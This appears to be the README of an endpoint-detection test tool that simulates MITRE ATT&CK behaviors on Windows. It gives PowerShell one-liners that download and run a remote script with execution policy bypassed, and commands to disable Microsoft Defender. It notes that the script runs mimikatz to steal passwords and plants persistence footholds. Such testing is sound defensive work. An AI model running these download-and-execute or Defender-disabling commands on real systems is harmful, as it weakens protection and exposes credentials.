## Datto EDR Behavioral Attack Simulator
**Platform:** Microsoft Windows 7+ or Server 2008+\
**Powershell Version:** 3.0+\
**.NET Version:** 4.5+

This script will execute several MITRE ATT&CK adversarial behaviors and add several footholds/Autoruns which are pointed at non-malware (calculator and cmd.exe).  The only malicous software run is mimikatz (steals passwords from memory) which will not persist.


The following command is all you need.  Run it on any windows system and it will download this script and execute it.  


> `[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1")`

OR If running from outside Powershell (like in cmd.exe or a batch script):
> `powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1") }`


While the script will attempt to disable MS Defender in the evasion step, you may need to proactively disable your endpoint protection prior to running this initial command to let it through:

> `powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $true'`
> 
> `sc stop WinDefend`

Restore Defender:
> `sc start WinDefend`
> 
> `powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $false'`


### WARNING: This script will leave your system in a messy state with some persist footholds set to launch calculators at varying times in the future. Run the cleanup script to remove these. 


### Cleanup Script:
Some persist footholds are left on systems in order to test non-realtime foothold scanning. Run this to remove them:
> `[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript_fullrestore.ps1")`


OR if running from outside Powershell (like in cmd.exe or a batch script):
> `powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript_fullrestore.ps1") }`
